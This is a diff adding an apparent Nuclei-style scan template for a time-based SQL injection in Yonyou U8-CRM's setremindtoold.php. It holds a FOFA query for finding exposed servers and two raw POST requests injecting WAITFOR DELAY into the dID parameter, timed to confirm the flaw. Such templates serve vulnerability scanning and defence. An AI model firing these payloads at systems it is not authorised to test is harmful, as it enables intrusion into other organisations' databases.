@@ -1,0 +1,49 @@
+id: poc-yaml-yongyon-u8-crm-setremindtoold-sqli
+info:
+  name: 用友U8-CRM setremindtoold.php SQL注入
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 用友U8+CRM
+    fofa: title="用友U8CRM"
+variables:
+  t1: "{{rand_int(5,9)}}"
+  t2: "{{to_number(t1) + 2}}"
+  t3: "{{rand_int(1,4)}}"
+  t4: "{{to_number(t3) + 2}}"
+http:
+  - raw:
+      - |
+        POST /ajax/setremindtoold.php?dID=1;WAITFOR+DELAY+'0:0:{{t1}}'-- HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=bgsesstimeout-;
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "1"
+        part: body
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1) && duration <= to_number(t2)"
+  - raw:
+      - |
+        POST /ajax/setremindtoold.php?dID=1;WAITFOR+DELAY+'0:0:{{t3}}'-- HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=bgsesstimeout-;
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "1"
+        part: body
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t3) && duration <= to_number(t4)"
